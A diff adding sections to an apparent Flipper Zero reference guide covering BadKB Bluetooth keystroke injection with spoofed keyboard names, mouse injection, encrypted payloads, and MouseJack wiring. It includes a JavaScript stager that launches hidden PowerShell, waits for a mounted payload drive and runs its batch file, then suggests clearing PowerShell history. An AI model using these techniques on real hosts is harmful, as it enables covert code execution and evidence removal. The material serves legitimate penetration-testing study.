@@ -265,6 +265,122 @@ ENTER
 - Some EDR / kiosk-mode software flags "100 keystrokes in 200 ms"; insert `DELAY 50` after each `STRING` if you need to look human.
 - The BadUSB app holds the USB stack — you can't run BadUSB and U2F simultaneously.
 
+## BadKB — BadUSB over Bluetooth LE
+
+Momentum (and a couple of others) ship **BadKB**: same Ducky DSL, same payload directory (`/ext/badusb/`), but the Flipper presents as a **BLE HID keyboard** instead of USB HID. The wins:
+
+- No physical USB connection. Pair the Flipper as a Bluetooth keyboard, sit nearby, fire payload.
+- Works against locked phones / tablets / TVs that take BLE keyboards. Modern macOS, Android, iOS, Windows all accept generic BLE HID.
+- Range is ~5–10 m unobstructed.
+
+Caveats:
+
+- The target has to **pair** first, and most OSes prompt for a 6-digit confirmation. BadKB has tricks for "JustWorks" pairing on permissive hosts.
+- BLE HID throughput is lower than USB — long `STRING` payloads are slower; budget ~50 chars/sec.
+- BLE typing is not invisible — it's a paired keyboard, visible in the OS' Bluetooth menu.
+
+Configure the device name from `Apps → Bad KB → Settings`. Common spoofs: `Apple Magic Keyboard`, `Surface Keyboard`, `Logitech K380`. Match the brand of the target host for plausibility.
+
+## Mouse Jiggler and HID mouse
+
+Two related toys:
+
+- **Mouse Jiggler** (FAP, several flavors) — emulates a USB HID mouse and nudges the cursor every N seconds. Defeats screensavers, presence-detection software, and "AFK after 5 min" kicks. Useful as a benign stowaway during long passive captures.
+- **HID mouse injection** — the BadUSB app has been extended (Momentum, Unleashed) with `MOVE x y`, `LEFTCLICK`, `RIGHTCLICK`, `MIDDLECLICK`, `WHEEL n` verbs. Combine with `STRING` to drive UIs that demand mouse input (e.g. dialogs that don't take Tab navigation).
+
+Example mixed payload:
+
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING calc
+ENTER
+DELAY 1500
+MOVE 200 200
+LEFTCLICK
+```
+
+The cursor coordinates are absolute on Windows when the host accepts an absolute-positioning mouse descriptor — by default Flipper sends relative deltas, so `MOVE 200 200` means "200 pixels right, 200 down from current position."
+
+## Encrypted Ducky payloads (`.crypt`)
+
+Some forks support encrypted `.crypt` payloads — same DSL, but stored AES-encrypted on the SD card. Workflow:
+
+1. Author a `payload.txt`.
+2. Use the fork's `Apps → BadUSB → Encrypt` (or a host-side `duckyencrypt` script) to produce `payload.crypt` with a passphrase.
+3. Distribute the `.crypt` file. To run it, the operator enters the passphrase on the Flipper.
+
+Useful when:
+
+- The SD card may be inspected and you don't want plaintext payloads visible.
+- You're shipping payloads to other operators without leaking the source.
+
+The crypto is symmetric AES — there's no key escrow, lose the passphrase and the payload is gone.
+
+## Autorun ↔ mass-storage swap pattern
+
+A common multi-stage trick uses the Flipper's ability to flip its USB persona mid-attack:
+
+1. **HID stage** — boot the host, type out a stager that sets up a download path (e.g. PowerShell that polls a known thumb-drive serial number).
+2. **`badusb.quit()`** — release the USB stack.
+3. **`usbdisk.start("/ext/disks/payload.img")`** — re-enumerate as a USB mass-storage device. The host's stager picks up the freshly-mounted volume by serial / volume label and pulls the payload.
+4. **`usbdisk.stop()`** — disconnect mass storage.
+5. Optional: `badusb.setup(...)` again and type `cleanup.txt` (delete temp files, clear PowerShell history).
+
+JS skeleton (see [javascript.md](javascript.md) for full module reference):
+
+```javascript
+let badusb  = require("badusb");
+let usbdisk = require("usbdisk");
+let delay_ms = function (ms) { delay(ms); };
+
+badusb.setup({});
+while (!badusb.isConnected()) delay(100);
+badusb.println("powershell -w h -c \"" +
+  "while (-not (Test-Path E:\\go.bat)) { Start-Sleep 1 }; " +
+  "Start-Process E:\\go.bat\"");
+delay(800);
+badusb.quit();
+
+delay(500);
+usbdisk.start("/ext/disks/payload.img");
+delay(60000);
+usbdisk.stop();
+```
+
+The volume label / serial inside `payload.img` is fixed at image-build time (`mkfs.fat -n DOLPHIN -i 0xC0FFEE`). Use that to make the host stager wait for *your* drive specifically rather than the next random USB stick someone plugs in.
+
+## MouseJack — wireless keyboard / mouse injection (NRF24 add-on)
+
+The Flipper itself can't do MouseJack — it has no NRF24 radio. With an NRF24L01+PA+LNA module wired to the GPIO header (commonly via a community **Mousejacker** FAP), the Flipper can replay the BastilleResearch CVE-2016-2225 family.
+
+Targets: unencrypted Logitech Unifying receivers (older firmware), some Microsoft / Dell / HP wireless keyboard receivers using NRF24L01-derived radios.
+
+Wiring (NRF24 module → Flipper GPIO):
+
+```
+NRF24 VCC  → pin 9   (3V3)
+NRF24 GND  → pin 11  (GND)
+NRF24 SCK  → pin 5   (PB3)
+NRF24 MISO → pin 3   (PA6)
+NRF24 MOSI → pin 2   (PA7)
+NRF24 CSN  → pin 4   (PA4)
+NRF24 CE   → pin 14  (PC3)
+NRF24 IRQ  → not connected
+```
+
+Workflow with the **NRF24 Mousejack** FAP:
+
+1. `Apps → GPIO → NRF24 Mousejack → Sniff`.
+2. The FAP scans 2.4 GHz channels for unencrypted dongles, prints discovered addresses.
+3. `Inject` → choose a captured address → choose a Ducky payload from `/ext/badusb/`.
+4. The NRF24 sends keystrokes that the unencrypted dongle accepts as if from its paired keyboard.
+
+Logitech rolled out firmware patches starting in 2019 — newer receivers ignore unsigned packets. Older ones still in the field don't.
+
+The same NRF24 + Flipper combo runs **NRF24 Sniffer**, **NRF24 Scan** (channel surveys), and **Mousejacker** under different naming conventions across forks. Same hardware, same idea.
+
 ## U2F — second factor security key
 
 The Flipper implements **FIDO U2F** (CTAP1) over USB HID. It does not implement FIDO2 / WebAuthn / passkeys, and it cannot present as a different existing security key because U2F includes per-key attestation and per-site key derivation.
